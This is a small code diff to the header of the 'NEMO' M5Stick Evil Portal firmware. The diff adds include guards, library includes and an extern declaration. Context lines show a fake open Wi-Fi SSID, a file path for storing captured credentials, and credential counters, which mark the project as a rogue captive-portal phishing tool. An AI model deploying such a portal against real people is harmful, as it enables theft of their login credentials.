@@ -2,6 +2,12 @@
 // has iterative iprovements over my own stand-alone M5Stick Evil Portal.
 // Retaining the Portuguese translations since this project has a large
 // fan base in Brazil. Shouts to CyberJulio as well.
+#ifndef PORTAL_H
+#define PORTAL_H
+
+#include <DNSServer.h>
+#include <WebServer.h>
+#include "sd.h"
 
 #define DEFAULT_AP_SSID_NAME "NEMO Free WiFi"
 #define SD_CREDS_PATH "/nemo-portal-creds.txt"
@@ -48,6 +54,8 @@
 #define LOGIN_AFTER_MESSAGE "Connexion en cours. Merci de patienter quelques instants."
 #define TYPE_SSID_TEXT "La longueur du SSID doit être entre 2 et 32\nInvalide: ?,$,\",[,\\,],+\n\nÉcrivez le SSID\nPressez Entrée pour Valider\n\n"
 #endif
+
+extern String apSsidName;
 
 int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = 0;
@@ -333,3 +341,5 @@ void setupWebServer() {
   Serial.println("Starting Webserver");
   webServer.begin();
 }
+
+#endif
